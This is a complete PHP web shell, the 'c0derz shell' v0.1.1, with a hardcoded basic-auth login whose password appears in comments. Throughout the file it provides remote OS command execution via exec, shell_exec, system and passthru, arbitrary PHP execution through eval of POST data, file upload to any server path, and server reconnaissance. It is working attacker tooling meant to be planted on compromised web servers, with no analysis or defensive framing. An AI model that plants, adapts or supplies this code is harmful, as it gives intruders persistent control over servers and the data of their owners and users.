<?php
/****************************************************************
*
*	.::[csh]::. //(.::[c0derz]::. web-shell) v. 0.1.1 release
*			 ----------------------------
*       c0ded by: [vINT 21h]
*       URL: http://c0derz.org.ua
*       e-mail: vint21h@c0derz.org.ua
*       ICQ: 255577736
*
****************************************************************/

/***************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License', or
 *   ('at your option) any later version.
 *
 ****************************************************************/


$self = $_SERVER['PHP_SELF'];
$docr = $_SERVER['DOCUMENT_ROOT'];
$achtung=1;
//authentification
$authentification = 1;
$name='63a9f0ea7bb98050796b649e85481845';//root
$pass='5cdbe638246729485a5eab6b93f170e2';//c0derz
$caption="Enter your login and password";
if ($authentification &&  (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || md5($HTTP_SERVER_VARS['PHP_AUTH_USER'])!=$name || md5($HTTP_SERVER_VARS['PHP_AUTH_PW'])!=$pass))
{
    header("WWW-Authenticate: Basic realm=\"$caption\"");
    header("HTTP/1.0 401 Unauthorized");
    exit("<BODY text=#000000 vLink=#000000 aLink=#000000 link=#000000 bgcolor=#888888><h1>Error 401</h1><h2>Unauthorized access!</h2>");
}
if($achtung)
  error_reporting(E_ALL&~E_NOTICE);
else
  error_reporting(0);
  //---------------------

//get page generating time
if (!function_exists("get_micro_time")) {
 function get_micro_time() {
  list($usec, $sec) = explode(" ", microtime());
  return ((float)$usec + (float)$sec);
 }
}
define("start_time",get_micro_time());
$cshver="<a href=http://c0derz.org.ua target='_BLANK' title='.::[c0derz shell]::.'><b>.::[csh]::.</b></a> v. 0.1.1 release";
 //-------------------------------

 //normalize text encoding
 function decode($buffer){
return  convert_cyr_string ($buffer, 'd', 'w');
}
//---------------------------------

?>

<HTML>
<HEAD>
<meta http-equiv='pragma' content='no-cache'>

<?php
echo "<TITLE>.:[csh]:.| [".get_current_user()."@".$SERVER_NAME."]</TITLE>";
?>

<STYLE>
BODY{scrollbar-base-color: 000000;
          scrollbar-face-color: #aaaaaa;
          scrollbar-highlight-color: #dddddd;
          scrollbar-shadow-color: #544554;
          scrollbar-dark-shadow-color: #111111;
          scrollbar-track-color: #222222;
          scrollbar-arrow-color: #dcdddc}

a:visited { color: #dcdcdc; text-decoration: none}
A:active { color: #dcdcdc; text-decoration: none; }
a:link {  color: #dcdcdc; text-decoration: none}
a:hover {  color: #ff3333; text-decoration: none}

BODY {
scrollbar-face-color: transparent;
scrollbar-shadow-color: transparent;
scrollbar-highlight-color: transparent;
scrollbar-3dlight-color: transparent;
scrollbar-darkshadow-color: transparent;
scrollbar-track-color: #777777;
scrollbar-arrow-color: #777777;
}
</STYLE>
</HEAD>
<BODY text=#000000 vLink=#000000 aLink=#000000 link=#000000 bgcolor=#888888>
<DIV align=center>
<TABLE bordercolor=#000000 cellSpacing=1 width=950 bgColor=#000000 border=0 height=600>
<hr>
<table width=950>
<tr>
  <td style="border: 1 solid #000000" bgcolor="677667">
<font size="1" face="verdana" color="#000000">
<left>
 <table width=100%>
<tr>
  <td style="border: 1 solid #000000" bgcolor="555555" >
  <font size="1" face="verdana" color="#000000">

<?php
echo "<font size=1 face=verdana color=fcfcfc><b>Server info:</b></font><br>";
?>

 </td>
 </tr>
 </table>

<?php
//server info
echo "Server name: <b><font color=#dcdcdc>".$SERVER_NAME."</b></font><br>";
echo "Server IP adress:<b><font color=#dcdcdc>".$server_ip=gethostbyname($SERVER_NAME)."</b></font> <br>";
echo (($safe_mode)?("Safe Mode: <font color=#ffffff><b>ON</b></font><br> "):
         ("Safe Mode: <font color=#555555><b>OFF</b></font><br> "));
echo "OS: <font color=#dcdcdc>";
 if (empty($uname)){
  echo (php_uname()."</font><br>");
 }else
  echo $uname."</font><br>";
  echo 'User: <font color=#dcdcdc>' .get_current_user() . '</font><br>';
   echo "HTTP Server: <font color=#dcdcdc>".$server=$HTTP_SERVER_VARS['SERVER_SOFTWARE']."</font><br>";
 echo ("PHP: <font color=#dcdcdc>".phpversion()."</font><br> ");
  echo ("MySQL: ");
 if($mysql_stat=function_exists('mysql_connect')){
  echo "<font color=#ffffff><b>ON</b> </font><b>";
 }
 else {
  echo "<font color=#555555><b>OFF</b> </font><br>";
 }
 //---------------------------
 ?>

 </td>
 </tr>
 </table>
<tr>
<td width="100" bgcolor="555555" valign="top">
<center>
<font face="tahoma" size="1" color="#000000"><div align="center"><b>.::[Shell functions]::.</b></div></font>
<font style="font: 11px/14px verdana, arial, sans-serif; color: #554455;">
<table width=100%>
<tr>
  <td style="border: 1 solid #000000" bgcolor="888888" onmouseover="this.style.backgroundColor='#677667';" onmouseout="this.style.backgroundColor='#888888';">
 <font style="font: 11px/14px verdana, arial, sans-serif; color: #554455;">
<a href="<?php echo $PHP_SELF."?mode=shell"?>" title="./$shell"><b>./ $shell</b></a><br>
</td>
 </tr>
 </table>
<table width=100%>
<tr>
  <td style="border: 1 solid #000000" bgcolor="677667" onmouseover="this.style.backgroundColor='#888888';" onmouseout="this.style.backgroundColor='#677667';">
 <font style="font: 11px/14px verdana, arial, sans-serif; color: #554455;">
<a href="<?php echo $PHP_SELF."?mode=phpcode"?>" title="PHP code execution">./php execution</a><br>
</td>
 </tr>
 </table>
 <table width=100%>
<tr>
  <td style="border: 1 solid #000000" bgcolor="677667" onmouseover="this.style.backgroundColor='#888888';" onmouseout="this.style.backgroundColor='#677667';">
 <font style="font: 11px/14px verdana, arial, sans-serif; color: #554455;">
<a href="<?php echo $PHP_SELF."?mode=upload"?>" title="Upload file to server">./ upload file</a><br>
</td>
 </tr>
 </table>
</div>
<br>
<br>
<br>
<br>
<br>
<td bgcolor="555555" valign="top" >
<center>
<div style="margin-top: 5;">
<table width="98%" cellpadding="1" cellspacing="0">
<tr>
  <td style="border: 1 solid #000000" bgcolor="555555" >
<font size="1" face="verdana" color="#fcfcfc">
<b><?php echo$head_text;?><b>
<tr>
<td colspan="3" bgcolor="#677667" style="border-left: 1 solid #000000" style="border-bottom: 1 solid #000000" style="border-right: 1 solid #000000">
<font face="Verdana" size="2" color="#000000">
<br>
<?php

if (!empty($_GET['mode'])) {$mode = $_GET['mode'];}
elseif (!empty($_POST['mode'])) {$mode = $_POST['mode'];}
else {$mode = "shell";}

switch($mode) {

case "shell":
$foot_stat="Current directory: <b><font color=#dcdcdc>[".getcwd()."]</font></b></tr>";
$head_text="Shell:";
chdir($dir);

function execute($com)
{

 if (!empty($com))
 {
  if(function_exists('exec'))
   {
    exec($com,$arr);
   echo implode('
',$arr);
   }
  elseif(function_exists('shell_exec'))
   {
    echo shell_exec($com);
   }
  elseif(function_exists('system'))
{
    echo system($com);
}
  elseif(function_exists('passthru'))
   {
    echo passthru($com);
   }
}

}
if ($cmd){

if($sertype == "winda"){
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}
else{
ob_start();
echo decode(execute($cmd));
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
}
if (trim($buffer)){
echo "<center><table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\">Executed command: <b><font color=#dcdcdc>[$cmd]</font></b></form></td></tr></table></center><left><textarea cols=200 rows=40 style=\"margin-left: 3; background-color: 555555; font-family: Tahoma; color: 000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\">";
echo decode($buffer);
echo "</textarea></center></div>";
}
}
echo "<table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\">
<form action=\"$REQUEST_URI\" method=\"POST\">
<table><tr><td><font size=1 face=verdana color=000000>[".get_current_user()."@".$SERVER_NAME."]: </font><INPUT type=\"text\" name=\"cmd\" size=50 value=\"$cmd\" style=\"margin-left: 3; background-color: 555555; font-family: Tahoma; color: 000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></td></tr></table>
<table><tr><td><font size=1 face=verdana color=000000>Current directory: </font><INPUT type=\"text\" name=\"dir\" size=50 value=\"";
echo getcwd();
echo "\"style=\"margin-left: 3; background-color: 555555; font-family: Tahoma; color: 000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\">
<INPUT type=\"submit\" value=\"Change directory =>\" id=input style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></td></tr></table></form></td></tr></table>";
break;
case "phpcode":
$head_text="PHP code execution:";
echo "<center><table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\"><b>PHP code:</b></td></tr></table><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=phpcode cols=200 rows=40 style=\"margin-left: 3; background-color: 555555; font-family: Tahoma; color: 000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></textarea><br><br>
<input type=\"submit\" name=\"submit\" value=\"                                     Execute PHP code =>                                     \" id=input style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></form></center></div>";
echo "<center><table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\"><center><b>Results of PHP execution:</b></center>";
@eval(stripslashes($_POST['phpcode']));
echo "</td></tr></table></center>";
break;
case "upload":
echo"<table width=100%><tr><td style=\"border: 1 solid \"000000\" \"bgcolor=677667\"><font size=\"1\" face=\"verdana\" color=\"#000000\">
<table>
<font size=\"1\" face=\"verdana\" color=\"#000000\">
<form enctype=\"multipart/form-data\" action=\"$self\" method=\"POST\">
<input type=\"hidden\" name=\"mode\" value=\"upload\">
<tr>
<td><font size=\"1\" face=\"verdana\" color=\"#000000\">File:</font></td>
<td><input size=\"48\" name=\"file\" type=\"file\" style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></td>
</tr>
<tr>
<td><font size=\"1\" face=\"verdana\" color=\"#000000\">Path:</font></td>
<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\" style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"><input type=\"submit\" value=\"Send\" style=\"margin-left: 3; background-color: #555555; font-family: Tahoma; color: #000000; font-size: 7pt; font-weight: none; border: 1px solid rgb(0,0,0)\"></td></tr></form></font></table></td></tr></table>";
if (isset($_POST['path'])){
$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}
echo"<table width=100%><tr><td style=\"border: 1 solid \"000000\" bgcolor=\"888888\"><font size=\"1\" face=\"verdana\" color=\"#000000\">";
if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "File sucessfuly uploaded in to directory: <font color=ffffff>[$uploadfile]</font><br>";
    echo "Name: <font color=ffffff>[".$_FILES['file']['name']. "]</font><br>";
    echo "Size: <font color=ffffff>[" .$_FILES['file']['size']. "]</font> Bytes<br>";
} else {
    print "Couldn't to upload file. Information:<br>";
    print_r($_FILES);
}
echo"</td></tr></table>";
}
break;
}
?>

 </tr>
  </td>
 </tr>
<tr>
  <td style="border: 1 solid #000000" bgcolor="555555" >
<font size="1" face="verdana" color="#000000"><?echo $foot_stat;?>
<tr>
  <td style="border: none bgcolor="555555">
<font size="1" face="verdana" color="#fcfcfc">
<br>
 <tr>
<tr>
  <td style="border: none bgcolor="555555">
<font size="1" face="verdana" color="#fcfcfc">
<br>
 </tr>
</table>
</div>
</td>
</tr>
</table>
<table width=950>
<tr>
  <td style="border: 1 solid #000000" bgcolor="677667" >
<font size="1" face="verdana" color="#000000">
<center>

<?php
echo "-=[".$cshver." | Page generation time: <font color=#fcfcfc>[<b>".round(get_micro_time()-start_time,4). "</b>]</font> seconds.]=-";
?>

 </td>
 </tr>
 </table>
</BODY>
</HTML>